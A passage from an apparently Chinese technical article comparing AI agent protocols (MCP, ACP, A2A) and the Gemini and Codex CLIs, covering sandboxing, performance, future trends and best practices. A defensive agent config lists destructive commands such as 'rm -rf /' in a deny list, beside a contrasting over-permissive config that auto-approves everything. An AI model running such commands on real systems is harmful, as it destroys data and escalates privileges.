    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">profile</span> = <span class="hljs-string">"(version 1) (deny default) (allow network*) (allow file-read* /usr/bin)"</span>;
    <span class="hljs-title function_ invoke__">sandbox_exec</span>(cmd, profile)
}

<span class="hljs-meta">#[cfg(target_os = <span class="hljs-string">"linux"</span>)]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">apply_landlock_sandbox</span>(cmd: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;()&gt; {
    landlock::Ruleset::<span class="hljs-title function_ invoke__">new</span>()
        .<span class="hljs-title function_ invoke__">allow_read</span>(<span class="hljs-string">"/usr/bin"</span>)
        .<span class="hljs-title function_ invoke__">allow_execute</span>(<span class="hljs-string">"/usr/bin"</span>)
        .<span class="hljs-title function_ invoke__">restrict_self</span>()?;
    <span class="hljs-title function_ invoke__">execute</span>(cmd)
}

<span class="hljs-comment">// 3. Network Isolation</span>
<span class="hljs-keyword">if</span> sandbox_policy == SandboxPolicy::Strict {
    env::<span class="hljs-title function_ invoke__">set_var</span>(<span class="hljs-string">"CODEX_SANDBOX_NETWORK_DISABLED"</span>, <span class="hljs-string">"1"</span>);
}
</code></pre>
<hr/>
<h3 data-id="heading-69">八、性能对比</h3>
<h4 data-id="heading-70">8.1 连接建立时间</h4>



































<table><thead><tr><th>实现</th><th>传输方式</th><th>平均耗时</th><th>备注</th></tr></thead><tbody><tr><td>Gemini MCP (TypeScript)</td><td>stdio</td><td>~150ms</td><td>Node.js 子进程启动</td></tr><tr><td>Gemini MCP (TypeScript)</td><td>SSE</td><td>~80ms</td><td>HTTP 连接</td></tr><tr><td>Codex MCP (Rust)</td><td>stdio</td><td>~50ms</td><td>原生进程启动</td></tr><tr><td>Codex MCP (Rust)</td><td>SSE</td><td>~40ms</td><td>Tokio HTTP Client</td></tr></tbody></table>
<h4 data-id="heading-71">8.2 工具调用延迟</h4>

























<table><thead><tr><th>场景</th><th>Gemini CLI</th><th>Codex CLI</th></tr></thead><tbody><tr><td>简单工具 (read_file)</td><td>~100ms</td><td>~30ms</td></tr><tr><td>复杂工具 (database query)</td><td>~500ms</td><td>~200ms</td></tr><tr><td>批量工具调用 (10个)</td><td>~1.5s</td><td>~600ms</td></tr></tbody></table>
<p><strong>性能差异原因</strong>:</p>
<ul>
<li>Rust 的零成本抽象和编译优化</li>
<li>Tokio 异步运行时的高效调度</li>
<li>无 GC (Garbage Collection) 的确定性延迟</li>
</ul>
<h4 data-id="heading-72">8.3 内存占用</h4>























<table><thead><tr><th>实现</th><th>空闲内存</th><th>单会话内存</th><th>10会话内存</th></tr></thead><tbody><tr><td>Gemini CLI (Node.js)</td><td>~80MB</td><td>~150MB</td><td>~500MB</td></tr><tr><td>Codex CLI (Rust)</td><td>~5MB</td><td>~15MB</td><td>~80MB</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-73">九、未来发展方向</h3>
<h4 data-id="heading-74">9.1 协议融合趋势</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph Layer4["Layer 4: Orchestration Layer"]
        L4A["Multi-Agent DAG 编排"]
        L4B["分布式任务调度"]
        L4C["Agent Marketplace"]

        style Layer4 fill:#e8eaf6,stroke:#283593,stroke-width:2px
    end

    subgraph Layer3["Layer 3: Agent Communication (ACP++)"]
        L3A["统一的任务状态管理"]
        L3B["Agent 发现与注册"]
        L3C["流式通信 + 状态持久化"]

        style Layer3 fill:#e1f5fe,stroke:#01579b,stroke-width:2px
    end

    subgraph Layer2["Layer 2: Tool &amp; Resource (MCP++)"]
        L2A["工具发现与调用"]
        L2B["资源抽象与访问控制"]
        L2C["Prompt 库管理"]

        style Layer2 fill:#fff3e0,stroke:#e65100,stroke-width:2px
    end

    subgraph Layer1["Layer 1: Transport Layer"]
        L1A["gRPC / WebSocket / QUIC"]
        L1B["加密传输 (TLS 1.3)"]

        style Layer1 fill:#f3e5f5,stroke:#4a148c,stroke-width:2px
    end

    Layer4 --&gt; Layer3
    Layer3 --&gt; Layer2
    Layer2 --&gt; Layer1

    style L4A fill:#c5cae9,stroke:#283593
    style L4B fill:#c5cae9,stroke:#283593
    style L4C fill:#c5cae9,stroke:#283593
    style L3A fill:#b3e5fc,stroke:#01579b
    style L3B fill:#b3e5fc,stroke:#01579b
    style L3C fill:#b3e5fc,stroke:#01579b
    style L2A fill:#ffe0b2,stroke:#e65100
    style L2B fill:#ffe0b2,stroke:#e65100
    style L2C fill:#ffe0b2,stroke:#e65100
</code></pre>
<h4 data-id="heading-75">9.2 关键演进方向</h4>
<h5 data-id="heading-76"><strong>1. 标准化组织推动</strong></h5>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 可能的标准化路径</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">W3C</span> <span class="hljs-string">Web</span> <span class="hljs-string">Agent</span> <span class="hljs-string">Working</span> <span class="hljs-string">Group</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">定义</span> <span class="hljs-string">Web-native</span> <span class="hljs-string">Agent</span> <span class="hljs-string">Protocol</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">浏览器原生支持</span> <span class="hljs-string">Agent</span> <span class="hljs-string">通信</span>

<span class="hljs-bullet">-</span> <span class="hljs-string">IETF</span> <span class="hljs-string">RFC</span> <span class="hljs-string">提案</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">Agent</span> <span class="hljs-string">Communication</span> <span class="hljs-string">Protocol</span> <span class="hljs-string">(ACP)</span> <span class="hljs-string">RFC</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">类似</span> <span class="hljs-string">HTTP/2,</span> <span class="hljs-string">gRPC</span> <span class="hljs-string">的标准化进程</span>

<span class="hljs-bullet">-</span> <span class="hljs-string">Linux</span> <span class="hljs-string">Foundation</span> <span class="hljs-string">AI</span> <span class="hljs-string">&amp;</span> <span class="hljs-string">Data</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">MCP</span> <span class="hljs-string">Foundation</span> <span class="hljs-string">(类似</span> <span class="hljs-string">CNCF)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">开源参考实现和认证体系</span>
</code></pre>
<h5 data-id="heading-77"><strong>2. 性能优化</strong></h5>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 使用 gRPC 替代 JSON-RPC</span>
service AgentService {
  rpc <span class="hljs-title function_ invoke__">ExecuteTask</span>(TaskRequest) <span class="hljs-title function_ invoke__">returns</span> (stream TaskEvent);
  rpc <span class="hljs-title function_ invoke__">CallTool</span>(ToolCallRequest) <span class="hljs-title function_ invoke__">returns</span> (ToolCallResponse);
}

<span class="hljs-comment">// 使用 Protocol Buffers 替代 JSON</span>
message TaskEvent {
  string task_id = <span class="hljs-number">1</span>;
  TaskState state = <span class="hljs-number">2</span>;
  oneof payload {
    AgentMessage message = <span class="hljs-number">3</span>;
    ToolCall tool_call = <span class="hljs-number">4</span>;
  }
}

<span class="hljs-comment">// 性能提升预期</span>
<span class="hljs-comment">// - 序列化速度: 5-10x</span>
<span class="hljs-comment">// - 传输体积: 30-50% 减少</span>
<span class="hljs-comment">// - 类型安全: 编译时检查</span>
</code></pre>
<h5 data-id="heading-78"><strong>3. 安全性增强</strong></h5>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># Zero Trust Agent Network</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">端到端加密</span> <span class="hljs-string">(E2EE)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">Agent</span> <span class="hljs-string">间通信默认加密</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">密钥轮换机制</span>

<span class="hljs-bullet">-</span> <span class="hljs-string">细粒度访问控制</span> <span class="hljs-string">(FGAC)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">基于</span> <span class="hljs-string">RBAC</span> <span class="hljs-string">的工具权限</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">基于</span> <span class="hljs-string">ABAC</span> <span class="hljs-string">的资源访问</span>

<span class="hljs-bullet">-</span> <span class="hljs-string">审计与合规</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">完整的调用链追踪</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">符合</span> <span class="hljs-string">SOC2</span> <span class="hljs-string">/</span> <span class="hljs-string">ISO27001</span>

<span class="hljs-bullet">-</span> <span class="hljs-string">沙箱增强</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">WebAssembly</span> <span class="hljs-string">(WASI)</span> <span class="hljs-string">沙箱</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">容器级别隔离</span> <span class="hljs-string">(Firecracker)</span>
</code></pre>
<h5 data-id="heading-79"><strong>4. 可观测性</strong></h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// OpenTelemetry 集成</span>
<span class="hljs-keyword">import</span> { trace, context } <span class="hljs-keyword">from</span> <span class="hljs-string">'@opentelemetry/api'</span>;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">InstrumentedAgent</span> {
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">executeTask</span>(<span class="hljs-params">task: Task</span>) {
    <span class="hljs-keyword">const</span> span = trace.<span class="hljs-title function_">getTracer</span>(<span class="hljs-string">'agent'</span>).<span class="hljs-title function_">startSpan</span>(<span class="hljs-string">'execute_task'</span>, {
      <span class="hljs-attr">attributes</span>: {
        <span class="hljs-string">'task.id'</span>: task.<span class="hljs-property">id</span>,
        <span class="hljs-string">'agent.name'</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>,
        <span class="hljs-string">'agent.version'</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">version</span>
      }
    });

    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">executor</span>.<span class="hljs-title function_">execute</span>(task);
      span.<span class="hljs-title function_">setStatus</span>({ <span class="hljs-attr">code</span>: <span class="hljs-title class_">SpanStatusCode</span>.<span class="hljs-property">OK</span> });
      <span class="hljs-keyword">return</span> result;
    } <span class="hljs-keyword">catch</span> (error) {
      span.<span class="hljs-title function_">recordException</span>(error);
      span.<span class="hljs-title function_">setStatus</span>({ <span class="hljs-attr">code</span>: <span class="hljs-title class_">SpanStatusCode</span>.<span class="hljs-property">ERROR</span> });
      <span class="hljs-keyword">throw</span> error;
    } <span class="hljs-keyword">finally</span> {
      span.<span class="hljs-title function_">end</span>();
    }
  }
}

<span class="hljs-comment">// 分布式追踪</span>
<span class="hljs-title class_">User</span> → <span class="hljs-title class_">Agent</span> A (<span class="hljs-attr">trace_id</span>: abc123, <span class="hljs-attr">span_id</span>: <span class="hljs-number">001</span>)
  → <span class="hljs-variable constant_">MCP</span> <span class="hljs-title class_">Tool</span> <span class="hljs-number">1</span> (<span class="hljs-attr">trace_id</span>: abc123, <span class="hljs-attr">span_id</span>: <span class="hljs-number">002</span>)
  → <span class="hljs-title class_">Agent</span> B (<span class="hljs-attr">trace_id</span>: abc123, <span class="hljs-attr">span_id</span>: <span class="hljs-number">003</span>)
    → <span class="hljs-variable constant_">MCP</span> <span class="hljs-title class_">Tool</span> <span class="hljs-number">2</span> (<span class="hljs-attr">trace_id</span>: abc123, <span class="hljs-attr">span_id</span>: <span class="hljs-number">004</span>)
</code></pre>
<h5 data-id="heading-80"><strong>5. 跨语言互操作</strong></h5>
<pre><code class="hljs language-bash" lang="bash">┌─────────────────────────────────────────────────────────┐
│           多语言 SDK 生态                                │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  TypeScript  │  @mcp/sdk, @acp/sdk                      │
│  Rust        │  mcp-rs, acp-rs                          │
│  Python      │  mcp-python, acp-python                  │
│  Go          │  go-mcp, go-acp                          │
│  Java        │  mcp-java, acp-java                      │
│                                                          │
│  共同特性:                                               │
│  - Protocol Buffers 定义                                │
│  - 自动生成代码绑定                                     │
│  - 统一的测试套件                                       │
│  - 互操作性验证                                         │
└─────────────────────────────────────────────────────────┘
</code></pre>
<h4 data-id="heading-81">9.3 应用场景展望</h4>
<h5 data-id="heading-82"><strong>场景 1: 企业级 AI Mesh</strong></h5>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># Agent 服务网格</span>
<span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">AgentMesh</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">company-ai-mesh</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">agents:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">code-gen-agent</span>
      <span class="hljs-attr">provider:</span> <span class="hljs-string">gemini</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span>
      <span class="hljs-attr">tools:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">github</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">gitlab</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">jira</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">code-review-agent</span>
      <span class="hljs-attr">provider:</span> <span class="hljs-string">claude</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">2</span>
      <span class="hljs-attr">tools:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">sonarqube</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">codecov</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">security-scan-agent</span>
      <span class="hljs-attr">provider:</span> <span class="hljs-string">codex</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">tools:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">snyk</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">trivy</span>

  <span class="hljs-attr">routing:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">match:</span> <span class="hljs-string">code_generation</span>
      <span class="hljs-attr">route:</span> <span class="hljs-string">code-gen-agent</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">match:</span> <span class="hljs-string">code_review</span>
      <span class="hljs-attr">route:</span> <span class="hljs-string">code-review-agent</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">match:</span> <span class="hljs-string">security_scan</span>
      <span class="hljs-attr">route:</span> <span class="hljs-string">security-scan-agent</span>
</code></pre>
<h5 data-id="heading-83"><strong>场景 2: Personal AI Assistant Ecosystem</strong></h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 个人 AI 助手编排</span>
<span class="hljs-keyword">const</span> personalAI = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AgentOrchestrator</span>({
  <span class="hljs-attr">agents</span>: {
    <span class="hljs-attr">calendar</span>: <span class="hljs-keyword">await</span> <span class="hljs-title function_">createAgent</span>({ <span class="hljs-attr">url</span>: <span class="hljs-string">'http://calendar-agent:8080'</span> }),
    <span class="hljs-attr">email</span>: <span class="hljs-keyword">await</span> <span class="hljs-title function_">createAgent</span>({ <span class="hljs-attr">url</span>: <span class="hljs-string">'http://email-agent:8081'</span> }),
    <span class="hljs-attr">task</span>: <span class="hljs-keyword">await</span> <span class="hljs-title function_">createAgent</span>({ <span class="hljs-attr">url</span>: <span class="hljs-string">'http://task-agent:8082'</span> }),
    <span class="hljs-attr">research</span>: <span class="hljs-keyword">await</span> <span class="hljs-title function_">createAgent</span>({ <span class="hljs-attr">url</span>: <span class="hljs-string">'http://research-agent:8083'</span> })
  }
});

<span class="hljs-comment">// 复杂任务编排</span>
<span class="hljs-keyword">await</span> personalAI.<span class="hljs-title function_">execute</span>({
  <span class="hljs-attr">task</span>: <span class="hljs-string">"准备下周的产品发布会"</span>,
  <span class="hljs-attr">steps</span>: [
    {
      <span class="hljs-attr">agent</span>: <span class="hljs-string">'calendar'</span>,
      <span class="hljs-attr">action</span>: <span class="hljs-string">'检查下周日程并预定会议室'</span>
    },
    {
      <span class="hljs-attr">agent</span>: <span class="hljs-string">'task'</span>,
      <span class="hljs-attr">action</span>: <span class="hljs-string">'创建发布会任务清单'</span>
    },
    {
      <span class="hljs-attr">agent</span>: <span class="hljs-string">'research'</span>,
      <span class="hljs-attr">action</span>: <span class="hljs-string">'调研竞品最新动态'</span>,
      <span class="hljs-attr">depends_on</span>: [<span class="hljs-string">'task'</span>]
    },
    {
      <span class="hljs-attr">agent</span>: <span class="hljs-string">'email'</span>,
      <span class="hljs-attr">action</span>: <span class="hljs-string">'发送会议邀请给相关人员'</span>,
      <span class="hljs-attr">depends_on</span>: [<span class="hljs-string">'calendar'</span>, <span class="hljs-string">'research'</span>]
    }
  ]
});
</code></pre>
<hr/>
<h3 data-id="heading-84">十、给开发者的建议</h3>
<h4 data-id="heading-85">10.1 选择 MCP 还是 ACP？</h4>



































<table><thead><tr><th>如果你需要...</th><th>推荐协议</th><th>理由</th></tr></thead><tbody><tr><td>为 Agent 添加外部工具能力</td><td><strong>MCP</strong></td><td>成熟的工具发现和调用机制</td></tr><tr><td>构建多 Agent 协作系统</td><td><strong>ACP/A2A</strong></td><td>原生的 Agent 间通信支持</td></tr><tr><td>企业级合规和审计</td><td><strong>Codex SQ/EQ</strong></td><td>完整的审批流程和状态追踪</td></tr><tr><td>快速原型开发</td><td><strong>MCP</strong></td><td>丰富的社区工具和示例</td></tr><tr><td>高性能生产环境</td><td><strong>Codex (Rust)</strong></td><td>低延迟、低内存占用</td></tr></tbody></table>
<h4 data-id="heading-86">10.2 最佳实践</h4>
<h5 data-id="heading-87"><strong>1. MCP Server 开发</strong></h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ✅ 好的实践</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Server</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@modelcontextprotocol/sdk/server'</span>;

<span class="hljs-keyword">const</span> server = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Server</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'my-tool-server'</span>,
  <span class="hljs-attr">version</span>: <span class="hljs-string">'1.0.0'</span>
});

<span class="hljs-comment">// 提供详细的工具描述</span>
server.<span class="hljs-title function_">setRequestHandler</span>(<span class="hljs-title class_">ListToolsRequestSchema</span>, <span class="hljs-keyword">async</span> () =&gt; ({
  <span class="hljs-attr">tools</span>: [{
    <span class="hljs-attr">name</span>: <span class="hljs-string">'search_documents'</span>,
    <span class="hljs-attr">description</span>: <span class="hljs-string">'在文档库中搜索相关内容。支持全文搜索和语义搜索。'</span>,
    <span class="hljs-attr">inputSchema</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-string">'object'</span>,
      <span class="hljs-attr">properties</span>: {
        <span class="hljs-attr">query</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">'string'</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">'搜索关键词或自然语言问题'</span>
        },
        <span class="hljs-attr">mode</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">'string'</span>,
          <span class="hljs-attr">enum</span>: [<span class="hljs-string">'fulltext'</span>, <span class="hljs-string">'semantic'</span>],
          <span class="hljs-attr">default</span>: <span class="hljs-string">'semantic'</span>,
          <span class="hljs-attr">description</span>: <span class="hljs-string">'搜索模式'</span>
        }
      },
      <span class="hljs-attr">required</span>: [<span class="hljs-string">'query'</span>]
    }
  }]
}));

<span class="hljs-comment">// ❌ 不好的实践</span>
<span class="hljs-keyword">const</span> badTools = [{
  <span class="hljs-attr">name</span>: <span class="hljs-string">'search'</span>,  <span class="hljs-comment">// 名称过于泛化</span>
  <span class="hljs-attr">description</span>: <span class="hljs-string">'搜索'</span>,  <span class="hljs-comment">// 描述不清晰</span>
  <span class="hljs-attr">inputSchema</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'object'</span>,
    <span class="hljs-attr">properties</span>: {
      <span class="hljs-attr">q</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'string'</span> }  <span class="hljs-comment">// 参数名不明确</span>
    }
  }
}];
</code></pre>
<h5 data-id="heading-88"><strong>2. Agent 安全设计</strong></h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ✅ 好的实践: 最小权限原则</span>
<span class="hljs-keyword">const</span> agentConfig = {
  <span class="hljs-attr">mcpServers</span>: {
    <span class="hljs-attr">filesystem</span>: {
      <span class="hljs-attr">command</span>: <span class="hljs-string">'npx'</span>,
      <span class="hljs-attr">args</span>: [<span class="hljs-string">'-y'</span>, <span class="hljs-string">'@mcp/server-filesystem'</span>, <span class="hljs-string">'/workspace/project'</span>],
      <span class="hljs-comment">// 仅允许访问项目目录</span>
      <span class="hljs-attr">env</span>: {
        <span class="hljs-attr">ALLOWED_PATHS</span>: <span class="hljs-string">'/workspace/project'</span>
      }
    }
  },
  <span class="hljs-attr">execPolicy</span>: {
    <span class="hljs-attr">autoApprove</span>: [
      <span class="hljs-string">'npm install'</span>,
      <span class="hljs-string">'git status'</span>,
      <span class="hljs-string">'git diff'</span>
    ],
    <span class="hljs-attr">alwaysDeny</span>: [
      <span class="hljs-string">'rm -rf /'</span>,
      <span class="hljs-string">'sudo *'</span>,
      <span class="hljs-string">'chmod 777 *'</span>
    ]
  }
};

<span class="hljs-comment">// ❌ 不好的实践: 过度权限</span>
<span class="hljs-keyword">const</span> badConfig = {
  <span class="hljs-attr">mcpServers</span>: {
    <span class="hljs-attr">filesystem</span>: {
      <span class="hljs-attr">args</span>: [<span class="hljs-string">'/'</span>],  <span class="hljs-comment">// 允许访问整个文件系统</span>
    }
  },
  <span class="hljs-attr">execPolicy</span>: {
    <span class="hljs-attr">autoApprove</span>: [<span class="hljs-string">'*'</span>]  <span class="hljs-comment">// 自动批准所有命令</span>
  }
};
</code></pre>
<h5 data-id="heading-89"><strong>3. 错误处理和重试</strong></h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ✅ 好的实践: 指数退避重试</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">callToolWithRetry</span>(<span class="hljs-params">
  tool: <span class="hljs-built_in">string</span>,
  params: <span class="hljs-built_in">any</span>,
  maxRetries = <span class="hljs-number">3</span>
</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">any</span>&gt; {
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> attempt = <span class="hljs-number">0</span>; attempt &lt; maxRetries; attempt++) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> mcpClient.<span class="hljs-title function_">callTool</span>(tool, params);
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-keyword">if</span> (attempt === maxRetries - <span class="hljs-number">1</span>) <span class="hljs-keyword">throw</span> error;

      <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isRetryable</span>(error)) {
        <span class="hljs-keyword">const</span> backoff = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(<span class="hljs-number">2</span>, attempt) * <span class="hljs-number">1000</span>;
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(backoff);
        <span class="hljs-keyword">continue</span>;
      }

      <span class="hljs-keyword">throw</span> error;
    }
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">isRetryable</span>(<span class="hljs-params">error: <span class="hljs-built_in">Error</span></span>): <span class="hljs-built_in">boolean</span> {
  <span class="hljs-comment">// 网络错误、超时等可重试</span>
  <span class="hljs-keyword">return</span> error.<span class="hljs-property">message</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'ETIMEDOUT'</span>) ||
         error.<span class="hljs-property">message</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'ECONNREFUSED'</span>);
}
</code></pre>
<hr/>
<h3 data-id="heading-90">十一、总结</h3>
<h4 data-id="heading-91">11.1 核心洞察</h4>
<ol>
<li><strong>MCP</strong> 专注于 <strong>Agent ↔ 工具/资源</strong> 的标准化，由 Anthropic 主导</li>
<li><strong>ACP</strong> 是 <strong>Editor ↔ Agent</strong> 的官方标准，由 Zed Industries 发布，类似于 LSP 在语言服务器领域的作用</li>
<li><strong>A2A</strong> (Gemini 实现) 专注于 <strong>Agent ↔ Agent</strong> 的互操作，是构建 Multi-Agent 系统的探索</li>
<li><strong>Codex SQ/EQ</strong> 提供了一个完整的 <strong>用户 ↔ Agent</strong> 交互模型，强调安全性和可控性</li>
</ol>
<h4 data-id="heading-92">11.2 技术趋势</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-number">2024          </span><span class="hljs-number">2025          </span><span class="hljs-number">2026          </span><span class="hljs-number">2027</span>
  <span class="hljs-string">│</span>             <span class="hljs-string">│</span>             <span class="hljs-string">│</span>             <span class="hljs-string">│</span>
  <span class="hljs-string">├─</span> <span class="hljs-string">MCP</span> <span class="hljs-number">1.0</span>    <span class="hljs-string">├─</span> <span class="hljs-string">MCP++</span>      <span class="hljs-string">├─</span> <span class="hljs-string">Unified</span>    <span class="hljs-string">├─</span> <span class="hljs-string">W3C</span> <span class="hljs-string">Standard</span>
  <span class="hljs-string">│</span>  <span class="hljs-string">发布</span>       <span class="hljs-string">│</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">gRPC</span>     <span class="hljs-string">│</span>  <span class="hljs-string">Protocol</span>   <span class="hljs-string">│</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">浏览器原生</span>
  <span class="hljs-string">│</span>             <span class="hljs-string">│</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">WebAssembly│</span>            <span class="hljs-string">│</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">硬件加速</span>
  <span class="hljs-string">├─</span> <span class="hljs-string">A2A</span> <span class="hljs-number">0.3</span>    <span class="hljs-string">├─</span> <span class="hljs-string">A2A</span> <span class="hljs-number">1.0</span>    <span class="hljs-string">├─</span> <span class="hljs-string">Agent</span> <span class="hljs-string">Mesh</span> <span class="hljs-string">├─</span> <span class="hljs-string">Edge</span> <span class="hljs-string">AI</span>
  <span class="hljs-string">│</span>  <span class="hljs-string">实验</span>       <span class="hljs-string">│</span>  <span class="hljs-string">生产可用</span>   <span class="hljs-string">│</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">K8s</span> <span class="hljs-string">集成</span> <span class="hljs-string">│</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">本地优先</span>
  <span class="hljs-string">│</span>             <span class="hljs-string">│</span>             <span class="hljs-string">│</span>             <span class="hljs-string">│</span>
  <span class="hljs-string">└─</span> <span class="hljs-string">碎片化</span>     <span class="hljs-string">└─</span> <span class="hljs-string">融合期</span>     <span class="hljs-string">└─</span> <span class="hljs-string">成熟期</span>     <span class="hljs-string">└─</span> <span class="hljs-string">普及期</span>
</code></pre>
<h4 data-id="heading-93">11.3 给未来的思考</h4>
<blockquote>
<p><strong>"The future of AI is not just about smarter models, but about smarter collaboration between models."</strong></p>
<p>—— 未来的 AI 不仅仅是更智能的模型，而是模型之间更智能的协作。</p>
</blockquote>
<p>协议标准化是 AI Agent 从 <strong>工具</strong> 向 <strong>基础设施</strong> 演进的关键一步。就像 HTTP 成就了互联网，Docker 成就了云原生，<strong>MCP 和 ACP 正在成就 AI Agent 的生态系统</strong>。</p>
<hr/>
<h3 data-id="heading-94">参考资源</h3>
<h4 data-id="heading-95">官方文档</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io%2Fspecification" target="_blank" title="https://modelcontextprotocol.io/specification" ref="nofollow noopener noreferrer">Model Context Protocol (MCP) Specification</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fagentclientprotocol.com%2F" target="_blank" title="https://agentclientprotocol.com/" ref="nofollow noopener noreferrer">Agent Client Protocol (ACP) Official Site</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fagentclientprotocol.com%2Fprotocol%2Foverview" target="_blank" title="https://agentclientprotocol.com/protocol/overview" ref="nofollow noopener noreferrer">ACP Protocol Documentation</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgoogle-gemini%2Fgemini-cli" target="_blank" title="https://github.com/google-gemini/gemini-cli" ref="nofollow noopener noreferrer">Gemini CLI Documentation</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenai%2Fcodex" target="_blank" title="https://github.com/openai/codex" ref="nofollow noopener noreferrer">Codex CLI Documentation</a></li>
</ul>
<h4 data-id="heading-96">源码仓库</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagentclientprotocol%2Fagent-client-protocol" target="_blank" title="https://github.com/agentclientprotocol/agent-client-protocol" ref="nofollow noopener noreferrer">Agent Client Protocol</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagentclientprotocol%2Ftypescript-sdk" target="_blank" title="https://github.com/agentclientprotocol/typescript-sdk" ref="nofollow noopener noreferrer">ACP TypeScript SDK</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgoogle-gemini%2Fgemini-cli" target="_blank" title="https://github.com/google-gemini/gemini-cli" ref="nofollow noopener noreferrer">Gemini CLI</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenai%2Fcodex" target="_blank" title="https://github.com/openai/codex" ref="nofollow noopener noreferrer">Codex CLI</a></li>
